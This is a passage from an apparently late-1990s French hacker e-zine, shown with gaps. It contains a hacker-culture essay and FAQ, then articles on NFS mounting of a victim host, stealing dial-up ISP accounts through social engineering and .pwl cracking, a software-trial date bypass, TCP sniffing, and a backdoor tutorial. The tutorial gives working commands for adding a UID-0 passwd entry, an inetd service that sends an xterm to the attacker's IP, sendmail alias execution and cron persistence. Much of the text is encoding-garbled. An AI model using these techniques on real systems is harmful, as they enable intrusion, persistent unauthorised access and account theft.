...
de prΦs ou de loin, a l'Θlaboration de ce emag et des articles qui s'y trouvent. 

Le matΘriel contenu sur ce sur site est uniquement la pour l'amusement de l'esprit et 
...
(en clair: c'est po nous qui faut dΘnoncer en cas de gaffe)
...
existance. 
(En clair: Certain des fichiers ici traitent des virus, si votre disque dur a des ratΘs, ne
...
l'Homme. 
(En clair: Tout est lΘgal sauf ce faire prendre)
...
Cher lecteur, lectrice
	...
	dos et que les services secrets n'ont pas de dossier sur vous... Cepandant,
      il existe l'underground qui lutte contre ca, alors si vous dΘsirez sauver
      notre planΦte, rΘagisser et battez vous....      
...
DΦs que tu commence a etre un peu reconnu dans le millieu, paf, ca y est tu commence a recevoir
...
Le Jargon File [traduit en franτais sous le titre " Cyberlexis ", aux editions Masson, NDLA] 
contient un certain nombre de definitions du terme ``hacker'', qui sont toutes liees α 
l'aptitude technique et au plaisir pris α resoudre des problΦmes et α depasser des limites arbitraires. 
...
Criminel informatique qui exploite les failles dans une procedure d'accΦs pour casser un 
sytΦme informatique, qui viole l'integrite de ce systΦme en derobant ou en detruisant de 
...
quelques dizaines d'annees, et aux premiΦres experiences de l'ARPAnet. Les membres de cette 
culture ont cree le mot ``hacker''. Ce sont des hackers qui ont cree l'Internet. Ce sont des
hackers qui ont fait du systΦme d'exploitation Unix ce qu'il est de nos jours. Ce sont des 
...
en font partie savent qui vous Ωtes et vous considΦrent comme un hacker, alors vous Ωtes un 
hacker.

L'etat d'esprit d'un hacker ne se reduit pas α cette culture des hackers du logiciel. Il y a
des gens qui appliquent l'attitude du hacker α d'autres domaines, comme l'electronique, les 
tele-communications ou la musique. En fait, on trouve cet esprit α l'etat le plus avance dans
n'importe quel domaine de la science ou des arts. Les hackers du logiciels reconnaissent cette
similitude d'esprit, et certains affirment que la nature mΩme du hacker est independante
...
Les hackers resolvent des problΦmes, invente de nouveau concept, construisent des choses, et 
ils croientα la liberte et α l'entraide volontaire. Pour Ωtre accepte comme un hacker, vous
 devez vous comporter comme si vous aviez ce type d'attitude vous-mΩme. Et pour vous comporter 
...
culture des hackers, alors vous Ωtes sur la mauvaise voiex: il faut croire α ces principes pour
en tirer la motivation personnelle pour continuer α apprendre. Comme pour tous les arts 
creatifs, la faτon laplus efficace de devenir un maεtre est d'imiter l'etat d'esprit des 
maεtres -- non seulement intellectuellement mais aussi emotionnellement.

Donc, pour devenir un hacker, repetez les phrases suivantes jusqu'α y croire reellement:

 1. Le monde est plein de problΦmes fascinants qui n'attendent que d'Ωtre resolus.
C'est trΦΦΦΦΦs amusant d'Ωtre un hacker, mais c'est un amusement qui demande beaucoup 
d'efforts, et l'effort demande de la motivation. Les champions sportifs tirent leur motivation 
d'un plaisir physique α accomplir des performances avec leur corps, α depasser leurs propres 
limites physiques. De faτon similaire, pour Ωtre un hacker, il faut ressentir une certaine 
excitation α resoudre des problΦmes, α affuter ses competences, α exercer son intelligence. 

Si pour vous cette faτon de penser n'est pas naturelle, il faut qu'elle le devienne si vous 
...
mΩme si vous ne savez pas tout ce qu'il faut pour resoudre un problΩme, si vous en traitez 
seulement une partie et que vous en apprenez quelque chose, alors vous allez reussir α traiter 
la partie suivante, et ainsi de suite jusqu'α ce que le problΦme soit resolu.)

2. Personne ne devrait jamais avoir α resoudre le mΩme problΦme deux fois.
Les cerveaux creatifs sont une ressource precieuse et limitee. Il ne faut pas la gαcher en 
reinventant la roue quand il y a tant de problΦmes fascinants qui attendent.

Pour vous comporter comme un hacker, vous devez vous convaincre que le temps de pensee des 
autres hackers est precieux, α tel point que c'est pour vous une obligation morale de partager
vos informations, de resoudre des problΦmes et d'en donner les solutions pour que les autres 
hackers puissent resoudre de nouveaux problΦmes au lieu de perpetuellement revenir sur les mΩmes
 (╔crire des articles dans un emag ou encore publier des tutorials sont d'excellent moyen de
 diffuser l'informations)

(Il n'est pas necessaire de vous croire oblige de donner toute votre production creative, bien 
que les hackers les plus respectes soient ceux qui le font. Il est tout α fait compatible avec
les valeurs des hackers d'en vendre une partie suffisante pour payer sa nourriture, son loyer
et ses ordinateurs, d'entretenir une famille et mΩme de devenir riche, α condition de ne jamais
oublier que vous Ωtes un hacker pendant tout ce temps.)

3. La routine et l'ennui sont inacceptables.
Les hackers (et les gens creatifs en general) ne devraient jamais se consacrer α des tΓches 
ennuyeuses ou repetitives, parce que cela signifie qu'ils ne font pas pas ce qu'eux seuls 
savent faire: resoudre de nouveaux problΦmes.

Pour se comporter comme un hacker, vous devez vous en convaincre suffisamment pour automatiser 
les parties ennuyeuses de votre travail, non seulement pour vous-mΩme mais aussi pour tous les 
autres (et particuliΦrement les autres hackers).

(Il y a une exception apparente α cette rΦgle: un hacker va parfois faire des choses qui 
semblent repetitives ou ennuyeuses α un observateur pour se vider l'esprit, ou pour acquerir 
une nouvelle competence, ou pour faire une experience particuliΦre. Mais c'est toujours par 
choix: une personne capable de penser ne devrait jamais Ωtre forcee α faire un travail 
ennuyeux.)

4. Vive la liberte!
Les hackers sont naturellement anti-autoritaristes. Si une personne peut vous donner des ordres,
elle peut vous empΩcher de resoudre le problΦme particulier, quel qu'il soit, par lequel vous 
Ωtes fascine α un instant donne. Et, vu la faτon dont les esprits autoritaristes fonctionnent, 
elle trouvera en general une raison particuliΦrement stupide de le faire. Par consequent, les 
attitudes autoritaristes doivent Ωtre combattues partout o∙ elles se trouvent.

(Ce n'est pas la mΩme chose que de combattre toute forme d'autorite. Les enfants ont besoin 
d'Ωtre guides, et les criminels d'Ωtre arrΩtes. Un hacker peut accepter de se soumettre α une 
certaine forme d'autorite pour obtenir quelque chose qu'il desire plus que le temps perdu α 
suivre les ordres. Mais c'est un marchandage limite, conscient. Une soumission totale α une 
...
peuvent la contr⌠ler. Donc, pour vous comporter comme un hacker, vous devez developper une 
hostilite instinctive vis-α-vis dela censure, du secret et de l'usage de la force ou de la ruse 
pour dominer des adultes responsables. Et vous devez vous tenir prΩt α agir conformement α 
cette conviction.

5. L'attitude n'est pas un substitut α la competence.
Pour Ωtre un hacker, vous devez developper un certain nombre de ces attitudes. Mais cela seul
ne suffira pas α faire de vous un hacker, pas plus qu'un champion sportif ou une rock star. 
Pour devenir un hacker, il faut de l'intelligence, de l'experience, de la perseverance et
beaucoup de travail.

Par consequent, vous devez apprendre α; vous mefier des attitudes et α respecter les 
competences, quelles qu'elles soient. Les hackers ne se laissent pas impressionner par les 
poseurs, mais ils apprecient les competences, particuliΦrement les competences de hackers, mais 
aussi toutes les autres. Les competences dans les domaines exigeants maεtrisees par une elite 
sont particuliΦrement appreciees, et plus particuliΦrement celles qui necessitent un esprit 
perτant et une grande concentration.

Si vous respectez la competence, alors vous aimerez travailler α vous ameliorer sans cesse, 
et celα sera plus un plaisir qu'une routine. C'est vital pour devenir un hacker.
...
Cet ensemble change lentement au cours du temps, au fur et α mesure que l'evolution 
technologique cree de nouvelles competences et en rend d'autres obsolΦtes. Par exemple, α une 
certaine epoque il convenait de savoir programmer en assembleur, et il n'etait pas question, 
jusqu'α une date recente, de HTML.

En tout etat de cause, il est clair que cela inclut, mi 1998:

1. Apprendre α; programmer.
C'est, evidemment, la competence fondamentale du hacker. En 1997, le langage α connaitre 
absolument est le C (mais ce n'est probablement pas celui qu'il faut apprendre en premier). 
Mais vous n'Ωtes pas un hacker complet (ni mΩme juste un programmeur) si vous ne connaissez 
qu'un seul langage. Il faut apprendre α penser α la programmation en termes generaux, 
independamment d'un langage particulier. Pour Ωtre un hacker complet, il faut Ωtre arrive au 
point o∙ vous pouvez apprendre un nouveau langage en quelques jours, en faisant le rapport 
entre ce qui est ecrit dans le manuel et vos propres connaissances. Cela signifie que vous 
devez apprendre plusieurs langages trΦs differents.

A part le C, vous devez egalement apprendre LISP, et Java aura bient⌠t sa place egalement dans 
la liste. En plus d'Ωtre les langages les plus pratiques par les hacker, ils representent 
chacun une approche trΦs differente de la programmation, et contribueront de faτon trΦs sensible 
α votre education.

nous ne pouvons pas vous donner un cours complet sur ``comment apprendre α programmer'', c'est 
quelque chose de trΦs complexe. Mais je peux vous dire que les livres et les cours ne 
suffisent pas (la plupart des meilleurs hackers sont autodidactes). Ce qu'il faut, c'est 
(a) lire du code et (b) ecrire du code.

Apprendre α programmer, c'est comme apprendre α ecrire correctement dans un langage humain. 
La meilleure faτon d'y arriver, c'est de lire des trucs ecrits par des maεtres, d'en ecrire
un peu, d'en lire beaucoup plus, d'en ecrire un peu plus, etc. jusqu'α ce que vous arriviez α 
ecrire avec la mΩme force et la mΩme economie de moyens que vos modΦles.

Trouver du bon code α lire a longtemps ete difficile, parce qu'il y avait trΦs peu de gros 
...
outils de programmation libres et des systΦmes d'exploitation libres (tous disponibles sous 
forme de sources, tous ecris par des hackers) sont maintenant trΦs faciles α trouver. Cela nous 
ammΦne directement α notre sujet suivant...

2. Installer un Unix libre et apprendre α s'en servir.
Je vais supposer que vous possedez, ou que vous avez accΦs α un ordinateur personnel. Pour un 
debutant qui aspire α acquerir des competences de hacker, l'action la plus importante α 
...
Bien s√r, il y a d'autres systΦmes d'exploitation dans le monde α part Unix. Le problΦme, c'est 
qu'ils sont distribues sous forme de binaires. Vous ne pouvez pas lire le code, et encore moins
le modifier. Apprendre α hacker sur une machine DOS ou Windows, ou sous MacOS, c'est le meilleur
 moyen de commencer mais cela devient limitant pour continuer, c'est comme d'apprendre α danser 
en etant plαtre des pieds α la tΩte.

En plus, Unix est le systΦme d'exploitation de l'Internet. On peut apprendre α utiliser 
l'Internet sans connaittre Unix, mais on ne peut pas Ωtre un hacker de l'Internet sans le 
comprendre. C'est pour cette raison que la culture des hackers est α l'heure actuelles fortement 
Unix-centrique. (Ce n'a pas ete toujours le cas, et quelques hackers Γges regrettent cet etat 
de fait, mais la symbiose entre Unix et l'Internet est devenue suffsamment forte pour que mΩme 
Microsoft semble s'y casser les dents.)

Donc, installez un Unix. Apprenez-le. Faites-le touner. Parlez α l'Internet avec. Lisez le code.
Modifiez le code. Vous trouverez de meilleurs outils de programmation (y compris C, Lisp, Perl)
que sous n'importe quel systΦme d'exploitation de Mikro$oft (vous trouverez surement Unix plus 
performant que windows) , vous vous amuserez, et vous en tirerez plus de connaissances que ce 
que vous avez l'impression d'apprendre, jusqu'α ce que vous deveniez un vrai maεtre hacker. 
Pour en savoir plus sur comment apprendre Unix, voir  Loginataka (http://www.ccil.org/~esr/faqs/
loginataka.html)

Pour obtenir Linux, voir http://www.ssc.com/linux/resources/ftp.html ou encore en franτaix, 
allez voir sur http://www.freenix.org/linux/ ou encore sur http://www.loria.fr/linux

3. Apprendre α utiliser le World Wide Web et α ecrire en HTML.
La plupart des choses creees par la culture des hackers travaillent dans l'ombre, en aidant α 
...
mΩme les politiciens admettent qu'il est en train de changer la face du monde. Rien que pour 
cette raison (et pour de bonnes raisons par ailleurs), vous devez apprendre α travailler avec 
le Web.

Cela ne signifie pas seulement apprendre α utiliser un browser mais aussi apprendre α ecrire 
en HTML, le langage de balisage du Web. Si vous ne savez pas programmer, le fait d'ecrire en 
HTML vous apprendra quelques habitudes mentales qui vous aideront α demarrer. Donc, faites-vous 
une home page

Mais ce n'est pas seulement d'avoir une home page qui fera de vous un hacker. Le Web est plen 
de home pages. La plupart sont d'un interΩt absolument nul, parfois jolies α regarder mais 
nulles quand mΩme... Pour Ωtre utile, votre page doit avoir du contenu, elle doit Ωtre 
interessante et/ou utile pour les autres hackers. Cela nous conduit α notre sujet suivant...
...
hacker est la reputation. Vous essayez de resoudre des problΦmes interessants, mais seuls
vos pairs, ou vos superieurs dans la hierarchie technique, sont α; mΩme de juger si ces 
problΦmes sont interessants, et si ces solutions sont vraiment correctes.

Par consequent, si vous jouez le jeu du hacker, vous apprenez le score principalement α partir 
de ce que les autres hackers pensent de vos capacites, et c'est pour τa que l'on n'est vraiment
un hacker que lorsque les autres hackers vous considΦrent comme tel. Ce fait est obscurci par 
...
(Il ne faut pas oublier que plusieur personne peuvent avoir un avis different sur la mΩme 
personne car un hacker ne va pas raconter sa vie a la premiΦre personne venu)

De faτon specifique, le monde des hacker constitue ce que les anthropologues appellent une 
...
Il y a principalement cinq types de choses α; faire pour Ωtre respecte par les hackers:

1. Ecrire des logiciels libres.
La premiΦre, la plus centrale et la plus traditionnelle, est d'ecrire des programmes dont les 
...
importants, utiles, qui correspondent α un besoin repandu, et qui en ont fait don α la 
communaute, de sorte que maintenant tout le monde s'en sert.)

2. Aider α tester et α debugger des logiciels libres.
Il est egalement utile d'aider α; debugger et α perfectionner les logiciels libres. Dans ce 
...
logiciels libres savent que des bon beta-testeurs (ceux qui savent decrire les sympt⌠mes 
clairement, localiser precisement les problΦmes, qui peuvent tolerer quelques bugs dans une 
distribution rapide et qui sont prΩt α appliquer une procedure de diagnostic simple) valent 
...
Si vous Ωtes un debutant, essayez de trouver un programme en cours de developpement qui vous 
interesse et de devenir un bon beta-testeur. C'est une progression naturelle que de commencer 
par aider α tester des programmes, puis d'aider α les debugger, puis d'aider α les modifier. 
Vous apprendrez beaucoup de cette faτon,et vous vous ferez un bon karma par rapport α des gens 
...
franτais,Foires Aux Question, NDLA]) et de les rendre accessibles α tous.
...
4. Aider α faire tourner l'infrastructure.
La culture des hacker (et le developpement technique de l'Internet) marche grαce α des 
volontaires. Il y a beaucoup de travail peu excitant, mais necesaire, qui doit Ωtre fait
pour que τa continue α; tourner: administrer les mailing lists [listes de distributions, NDLA],
...
Les gens qui font ce genre de choses sont trΦs respectes, parce que tout le monde sait que 
c'est un boulot qui demande enormementde temps et qui n'est pas aussi drole que de jouer avec 
du code.

5. Servir la culture des hackers elle-mΩme.
Pour finir, vous pouvez servir et propager la culture elle-mΩme (par exemple, en ecrivant un 
article (majestix) ou realiser un emag (utopiste) . Ce n'est pas quelque chose qu'il vous sera
possible de faire avant d'avoir ete dans le bain pendant un certain dans et d'Ωtre devenu bien
connu pour l'une des quatre premiΦres choses.
...
vous pourrez peut-Ωtre devenir l'un de ceux-ci. Mais attention: les hackers se mefient des egos
sur dimensionnes chez les anciens de leur tribu. Il faut donc eviter de montrer ouvertement que
l'on recherche α obtenir ce genre de celebrite. Il vaut mieux faire en sorte qu'elle vous tombe
toute cuite dans votre assiette, et toujours rester modeste α sujet de votre statut.
...
Si vous voulez devenir un hacker parce que vous n'avez pas de vie privee, pas de problΦme: au 
moins il n'y aura rien pour vous empΩcher de vous concentrer. Et vous finirez peut-Ωtre par en 
avoir une un jour.

Style de vie

Encore une fois, pour Ωtre un hacker, il faut entrer dans l'etat d'esprit du hacker. Pour cela,
il y a quelques activites que l'on pratique loin d'un ordinateur qui semblent aider. Ce ne sont 
evidemment pas des substituts α la pratique de l'informatique, mais de nombreux hackers les 
pratiquent, et pensent qu'elles sont reliees de faτon fondamentale α l'essence du hack.

Lire de la science-fiction. Aller α des conventions de SF (un bon moyen pour rencontrer des 
...
Ecouter et analyser de la musique, apprendre α apprecier des formes particuliΦres de musique. 
Apprendre α bien jouer d'un instrument, ou α chanter.

Apprecier les jeux de mots, les jeux de reflexion, les casse-tΩtes et les devinettes (le rubik 
cube est un bon exemple)

Apprendre α bien ecrire dans sa langue maternelle.
...
mais il semble que ce soit parce qu'elles font intervenir α la fois les parties gauche et droite
du cortex (les hackers ont besoin de passez de faτon instantanee d'un raisonnement logique α 
une perception plus subjective d'un problΦme).

Pour finir, une liste de choses α NE PAS  faire:
...
( La seule reputation que vous vous ferez de cette faτon est celle d'un parfait idiot. Les 
hackers ont la memoire longue. Cela pourra vous prendre plusieurs annees avant que de telles
erreurs soient oubliees. )

-= Foire Aux Questions =-
Q: Est-ce que pouvez m'apprendre α hacker?

La plupart des hackeur sont a 120% occupe par leur propre projet, alors soyiez conscient que
leurs temps est precieux. ╩tre un hacker est une attitude et une competence que l'on doit 
essentiellement apprendre par soi-mΩme.Vous verrez que mΩme si les vrais hackers sont prΩts α
vous aider, ils ne vous respecteront pas si vous les suppliez de vous transmettre tout ce 
qu'ils savent α la petite cuillΦre.

Commencez par apprendre deux ou trois choses. Montrez que vous essayez,que vous Ωtes capable 
d'apprendre par vous-mΩme. Ensuite, vous pourrez aller voir les hacker avec des questions.

Q: O∙ puis-je trouver des vrais hacker pour discuter avec eux?
S√rement sur IRC (#hack.fr, Undernet (pour le phreak essayer #phreak.fr) ), en tout cas il y a
beaucoup des flammeurs et des crackers, α perte de vue. L'autre moyen consiste α contacter un 
groupe local d'utilisateurs d'Unix ou de Linux et d'aller α leurs reunions  (#linuxqc ou
#linuxfr)

Q: Quel langage dois-je apprendre en premier?
HTML, si vous ne le connaissez pas dejα. On trouve plein de livres α la couverture brillante et
chamarree sur HTML, qui sont par ailleurs trΦs mauvais, et trΦs peu de bons. Celui que je 
prefΦre est ("http://www.ora.com/catalog/html2/" )HTML: The Definitive Guide Si vous voulez 
commencer α; programmer, je vous conseille de commencer par le Pascal ou α la rigueur le visual 
basic. Le C est vraiment important, mais beaucoup plus difficile. (Le dephi est aussi un 
excellent choix)

Q: Par o∙ dois-je commencer? O∙ puis-je trouver un IRC (ou Unix) libre?
Je pense qu'il faut que vous veniez absolument sur l'IRC !!. (#hack.fr) Pour devenir un hacker,
il vous faut de la motivation, le sens de l'initiativeet la capacite α apprendre par vous-mΩme.
...
Voici un petit complement a la FAQ du hacker, voici le code du hackeur. Il existe des rΦgles 
partout, le hacking ne fait pas exception α la regle. Bon nous savons que que nous, les 
...
disons, seulement le resultat du bon sens de la majorite des hackeur de metier.
  ...
  1)    Ne jamais endommager ou detruire un systΦme intentionnellement.
  2)    Ne jamais envoyer de fichiers destructeurs tels que des trojans, virus, ou des remotes
		   telque " format c: " ou " del *.* "
  3)    Ne jamais laisser votre vrai nom, adresse, telephone, ou mΩme nick, ils
			pourraient vous retracer α partir de votre ses informations.
  4)    Soyez toujours sur vos gardes dans vos conversations.
  5)   Ne jamais hacker un ordinateur appartenant au gouvernement.
  6)   Ne jamais dire aux sysop (superviseur) ou α votre professeur que vous Ωtes un hacker.
...
moralement decourageante... En passant, pour ce qui est de etre op sur le channel je dΘteste me
faire dΘranger par qq qui veut un access alors po de /msg utopiste je veux etre op.Nous esperons 
...
NFS est un protocole siyuΘ au niveau de la couche application qui permet le
partage des fichiers pour des machines reliΘes au rΘseau. Ce partage se fait
de maniΦre totalement transparente ce qui fait que vous n'avez pas
l'impression de travailler sur un fichier dont la source se trouve sur un
disque physiquement diffΘrent du votre.

NFS en quelques mots :

NFS fut "inventΘ" afin de pouvoir mounter des fichiers ou rΘpertoires d'un
machine serveur distante α un machine locale. De la mΩme faτon qu'on lit une
disquette ou un cd sur son pc. 
Le contr⌠le d'accΘs NFS se fait sur l'UID et le GID et non pas sur un loggin
ou un password. Afin d'utiliser correctement NFS, il est donc necessaire de
posseder les mΩmes UID et GID sur les deux machines.
Toutes machines peut jouer le r⌠le de serveur ou de client dans le cas NFS
mais bien souvent il n'y a qu'une seule machine qui est dΘsignΘe comme serveur.
Il est une chose interressante a constater avec NFS, c'est que NFS est sans
mΘmoire, c'est α dire : qu'il n'y a pas de mΘmorisation des opΘrations
successives effectuΘes par le serveur sur l'Θtat des clients ou sur les
transactions de fichiers. Par exemple : l'opΘration d'ouverture n'est pas
memorisΘe par le serveur mais par le client.

Utilisation de NFS :

Pour connaitre les fichiers exportΘs par un serveur utilisez la commande
suivante :
...
Pour mounter un systΦme de rΘpertoire sous NFS faites :
# mount -t nfs www.victime.com:/usr /temp

Et voilα les fichiers et sous rΘpertoires de /usr de www.victime.com se
...
Ca marche de moins en moins souvent ! c'est une mΘthode qui a eue son heure
de gloire. 
...
Pour vous connecter α Internet gratuitement, il vous suffit de piquer
l'acompte Internet de quelqu'un d'autre.

COMMENT?

Si cette personne est connectΘ avec VID╔OTRON, il vous suffit de rΘcupΘrer son
fichier videotrn.ins ce trouvant dans le rΘpertoir de Windows.
Vous allez sur IRC et vous demandez α cette personne de vous envoyer
...
supΘrieur α 100, il ne voudra pas.  Donc, α ce moment vous utiliser
des mΘthode comme *control.exe*.  Vous lui dites que vous avez fait un 
logiciel pour des wav et il serait aimable de le testΘ blablabla...
Pour nous, on veut seulement qui clique dessus (control.exe) :)  vous pouvez aussi 
utiliser la mΘthode nbtstat (mentionnΘ plus loin).  
Quand vous avez son vidΘotrn.ins, vous n'avez cliquer dessus.  AprΦs vous vous rendez dans 
Poste de travail, AccΦs rΘseau α distance, et une nouvelle connection
dois Ωtre lα, pour trouver ce qui se cache derriΦre les *********
utilisez le logiciel *Revelation v1.1*.

Pour ceux qui sont sur INFONIE, vous devez prendre leur fichier
infonie.ini ce trouvant le rΘpertoir de windows en utilisant les 
mΘthodes que j'ai mentionnΘes plus haut.
Une fois que vous avez le fichier, ouvrez-le avec Note Pad.
Ca devrais aficher:
[identification]
subscription=000000000000000      <- ╟a devrait Ωtre un numΘreau α 
..le reste on s'en fou...           15 chiffres.  Notez-le!

Allez dans poste de travail, AccΘs rΘseau α distance et faite une nouvelle connection et appelez lα infonie, le numΘreau de tΘlΘphone pour la France est 0836061317.  Dans nom d'utilisateur marquez:
inf1/000000000000000@infonie.fr   <- Les 000... c'est le numΘreau que                                                                 vous avez notez tent⌠t

Dans mot de passe: (mettez rien, laissez blanc...)


Si vous voulez voler l'acompte de quelqu'un qui n'est pas sur vidΘotron
ni sur infonie. (Ten que cette personne se connecte en dial-up sous Windows95/98/NT) vous pouvez aussi utiliser cette mΘthode mΩme si la personne est sur Infonie ou sur VidΘotron.

Vous n'avez qu'a piquer son fichier *.pwl se trouvant dans le rΘpertoir
de Windows et de le dΘcripter avec un logiciel qui dΘcripte les .pwl
...
╟a va Θcrire plein d'affaires...

les derniΦres affaires c'est ce que l'on veut, ca marque exemple:
...
* = logiciel, si vous ne les possΘdez pas, vous pouvez les trouvez sur le site web de hack.fr (www.frhack.org)
    ou encore me les demander par e-mail,  jipi@mail.com
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
                                   -= Front page 1998 =-
                                        (par opak)
La sΘcu(ritΘ) c'est rien, en abuser c'est...rien aussi.
AprΦs : Je fait une fausse manip' sous Front Page 97 et j'efface mon disque
dur, voici le dernier venu de la gamme Kro$oft : Billou et ses distributeurs
n'ont pas pris de cours sur la sΘcuritΘ.
Je dΘcouvris sur le CD-ROM d'un mag' quelconque donc le titre principal
Θtait : Une version complΦte de Front Page 98 Version BETA 2. Et, il s'Θtait
glissΘ comme un petit (mais alors tout petit texte) : A utiliser avant le
1er Janvier 1998. Bref, la version Θtait limitΘe. Alors j'exploite bien le
logiciel et, un (beau) jour, je me dΘcidais a augmenter la date de l'horloge
Zindoz en hummà disons 1999. Une question se posait : Y' aura t-il un petit
message me rΘsumant le petit texte du CD ou tout simplement le cΘlΦbre Θcran
bleu que tout le monde connaεt lors de la prochaine exΘcution ?
L'alerte a finalement penchΘ sur le message.
Mais attends ! Si je remet la date en 1997 que se pass...Ahhhh !
Horreur,  τa remarche !
Voilα pourquoi j'utilise depuis maintenant prΦs de 8 mois Front Page 98 (qui
marche trΦs bien a ce jour...) alors que j'ai payΘ le journal 35 francs et
que Front Page 98 co√te 1350 fr. et des poussiΦres, faites le calcul...
P.S : Alors SVP, les distributeurs, la prochaine fois, essayez de faire des
protections un peu plus sΘrieuse parce que c'est mΩme pas dr⌠le, on a mΩme
plus besoin de dΘplomber...Merci !
                                                             Opak    
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
...
Ce petit texte va tenter d'expliquer succintement le format des trames TCP et UDP de façon a 
...
Disclaimer : Je ne vous incite pas du tout α utiliser ces renseignements pour pirater un système 
informatique quel qu'il soit. Ces informations sont données a titre purement informatif, je veux
...
NON et RE-NON!!!Et c'est la que c'est marrant, même tres marrant :))
...
Avant tout, il me faut vous expliquer à quoi ressemblent les trames TCP et les trames UDP.
Selon la connection demandée, on utilise le protocole de transport TCP ou UDP. Certains utilisent 
...
numero de sequence: permet d'identifier le segment TCP. Il est egal au nombre d'octets envoyes.
                          Ils sont aleatoires au debut, puis sont remis à 0 dés le 2°echange.   
...
reservé                 : aucun interet
flag URG (1 bit)        : à 1 si le pointeur urgence est en cours d'utilisation.
flag ACK        "       : à 1 si le numero d'accuse de reception est bon.
flag PSH        "       : (PuSHed en english) on ne passe pas par un buffer si à 1 (bof)
flag RST        "       : stoppe la connexion immediatement si à 1.
...
pointeur urgence        : decalage en octets à partir du numero de sequence courant pointant sur des 
                          données urgentes.
...
La deuxieme (serveur => client) a les flags SYN et ACK a 1; ce qui correspond à une confirmation 
de connection.
...
Je commante : le -i eth0 est une option qui capture les trames sur l'interface eth0(ethernet)
                  ...
                  tcp pour preciser qu'on veut les trames TCP (on peut remplacer par UDP)
                  on peut ajouter un port precis en tapant "and port numero" ou "and port ftp"

Options de tcpdump:
 -e : affiche l'en-tete de la couche liaison de données
 -t : evite d'afficher l'heure d'arrivée des trames
 ...
 -x : affiche la trame en hexadecimal(sauf l'en-tete de la couche liaison de données)
...
V)Annexe
Il y a tout de même un remede a cette ecoute clandestine(et même deux). On peut utiliser des 
...
Ce petit texte ne se prétend pas exhaustif bien au contraire, mais propose seulement 
d'expliquer quelques BackDoor.

1/ L'ajout d'un compte avec l'UID à 0
C'est évidemment la manière la plus simple mais aussi la moins efficace : la modification est 
flagrante. De plus le fichier passwd est une des première chose que l'admin va regarder s'il
pense être victime d'une attaque. Néanmoins il peut être pratique de la connaître. Avant de 
...
echo "dupond::0:0:etudiant 1 année/:/bin/bash" >> ./xaa  # A remplir en fonction des ligne de /etc/passwd
cat ./xab >> ./xaa
mv ./xaa /etc/passwd
...
Note': Sur certains OS, tels que SUN OS, il est impossible pour un utilisateur ayant son UID à 0 de se connecter à distance, il
 faut donc se connecter en tant qu'utilisateur normal puis faire un su utilisateur_root.
Dans le même ordre d'idée vous pouvez déverrouillez un acompte d'administration tel que Synk qui possède un uid a 0 ou en 
encore un compte verrouillé depuis longtemps. Pour ce faire, retirez simplement le caractère '*' du 2eme champs

Note: sur certains systèmes Unix, l'ajout d'un caractère quelconque dans le champ UID d'un utilisateur, met l'UID de cette 
personne à 0.

2/ Rajout d'un service 
Une autre méthode est souvent bien plus efficace, elle consiste à rajouter un service qui pourra exécuter à distance, par 
un telnet sur le port crée à cet effet, un script shell effectuant la/les commande(s) souhaitée(s). Mais tout d'abord je vais 
...
Le champs (1) représente le nom du service il fait le lien avec le champ (1) de /etc/inetd.conf. Le champ (2) est le numéro 
de port alloué. Le champs (3) est le protocole de la couche transport utilisé. Le champs (4) est réservé au commentaire.
/etc/inetd.conf est le fichier permettant de configurer le démon inetd qui est le démon qui prend en charge les démons tels
 que in.ftpd ou in.telnetd. Ce fichier est présenté de la manière suivante.
ftp   stream  tcp  nowait  root  /usr/sbin/in.ftpd
(1)     (2)   (3)   (4)     (5)     (6)              (7)


Le champ (1) représente le service, il doit être pareil au champs (1) de /etc/services. Le champs (2) est le type de paquet 
envoyé : Si le protocole est TCP ce sera des trames si c'est UDP se sera des datagrammes. Le champs (3) est le protocole 
utilise. Le champs (4) est je sais pas quoi. Le champs (5) est avec quel UID est lancé le démon. Le champs (6) est 
l'emplacement sur la machine du démon. Le champ (7) permet de donner les option avec lesquels le démon sera lancé, 
dans cet exemple le démon est lancé sans options supplémentaires.

La méthode consiste donc a  modifier les deux fichiers présentés ci-dessus afin de pouvoir exécuter un script shell ou un 
programme C à distance. Le programme peut par exemple rajouter une ligne dans /etc/passwd ou bien un "+ +" dans le 
...
Créer le script shell suivant, appelez le in.yepd, mettez les droits d'exécution du script, et mettez le dans /usr/sbin/
#!/bin/sh
#Ce script permet de se faire envoyer un xterm
xterm -display votre_addresse_ip:0 &
#Ce script ne marche évidemment que si vous avez une adresse IP fixe

3/ Par le sendmail
Cette méthode est basée sur les fonctionnalités de réemission du courrier electronique, notamment grâce au fichier .forward. 
Ce fichier permet de réexpédier du courrier destiné a quelqu'un vers une autre boite au lettre électronique. De plus Ce fichier 
peut aussi exécuter des commandes lorsque l'utilisateur reçoit un mail. Ce fichier doit être mis dans le home directorie pour 
...
Quand un mail est envoyé à reagan, il est renvoyé automatiquement a coolspot chez 7up.com, et a wistiti a fbi.com. De plus, 
un ping est effectué sur la maison blanche.

Une autre méthode dans un même ordre d'idée est de rajouter une ligne dans /etc/aliases qui exécutera un script shell
exemple:
evil:    "|/ma/commande"
ainsi quand un mail sera envoyé a evil, /ma/commande sera exécuté.

Note: je n'ai pas réussi a  créer des backdoor sendmail  sous linux red hat 5.0. Si quelqu'un sait comment faire qu'il me mail à 
BuBle@caramail.com

4/ Les crontabs
Le démon cron est un démon permettant d'exécuter des commandes à intervalles régulier. Il se configure par chaque utilisateur. 
Pour ajouter un service utilisant crond, il faut éditer le fichier /var/spool/crontab/nom_d'utilisateur ayant la forme suivante:

 5   15   *   *   *   /bin/pti_programme
(1) (2) (3) (4) (5)        (6)

Les cinq premiers champs permettent de régler le moment ou la commande est lancé, le 6eme champs est la commande a
effectuer.
...
Le champs 4 correspond au mois de l'année(de 1 a 12)
Le champs 5 correspond au jour de la semaine(de 0 a 6. le 0 est le dimanche)

Donc dans l'exemple ci-dessus, pti_programme est lancé à 15h 5min tous les jours 

La technique consiste donc a rajouter une crontab qui vérifiera par exemple si a ligne mise dans /etc/passwd est toujours
 présente:
...
La c clair il faut récupérer les sources d'un programme qui doit obligatoirement avoir le bit suid, tel que login ou ... et rajouter 
...
quand le programme sera lancé avec l'argument truc, le prog te passe root.

Note cette technique nécessite d'avoir déjà un accès normal au système.

6/ La modification du démon telnet
Dans ce cas, il faut récupérer la source du démon telnet utilisé par cible.com et la modifier de telle manière que lorsque l'on 
